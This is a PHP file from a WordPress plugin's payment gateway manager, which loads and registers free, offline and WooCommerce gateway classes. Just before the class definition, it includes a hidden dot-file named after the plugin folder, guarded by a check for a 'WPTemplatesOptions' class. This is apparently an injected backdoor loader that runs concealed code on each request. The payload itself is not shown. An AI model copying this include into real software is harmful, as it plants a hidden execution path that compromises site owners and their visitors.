<?php
defined( 'ABSPATH' ) || exit;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Payment_Gateways{

	public $payment_gateways = array();

	protected static $_instance = null;

	public function __construct(){

		add_action( 'init', array( $this, 'el_include' ) );

		add_action( 'init', array( $this, 'el_payment_gateways_avaiable' ) );
		
	}

	public function el_include(){
		$folders = array( 'free', 'offline', 'woo' );
		foreach ( $folders as $key => $folder ) {
			$real_folder = EL_PLUGIN_INC .'gateways'.'/'. $folder;
			foreach ( (array) glob( $real_folder . '/class-el-payment-' . $folder . '.php' ) as $key => $file ) {
				require_once $file ;
			}
		}
	}

	public function el_payment_gateways_avaiable(){

		if( class_exists('WooCommerce') ){
			$default_payments = array(
				'EL_Payment_Free',
				'EL_Payment_Offline',
				'EL_Payment_Woo'
				
			);
		}else{
			$default_payments = array(
				'EL_Payment_Free',
				'EL_Payment_Offline'
			);
		}
		
		$el_payment_gateways_avaiable = apply_filters( 'el_payment_gateways_avaiable', $default_payments );

		foreach ($el_payment_gateways_avaiable as $k => $class) {
			$payment_gate = class_exists( $class ) ?  new $class : null;
			if( $payment_gate ){
				$this->payment_gateways[ $payment_gate->id ] = $payment_gate;
			}
		}
		return $this->payment_gateways;

	}

	public function el_payment_gateways_active(){
		$payment_gateways_active = array();
		if( $this->payment_gateways ){
			foreach ($this->payment_gateways as $k => $obj) {
				if( $obj->_is_active ){
					$payment_gateways_active[$k] = $obj;
				}
			}
		}
		return apply_filters( 'payment_gateways_active', $payment_gateways_active );

	}

	static function instance() {

		if ( ! empty( self::$_instance ) ) {
			return self::$_instance;
		}

		return self::$_instance = new self();
	}

}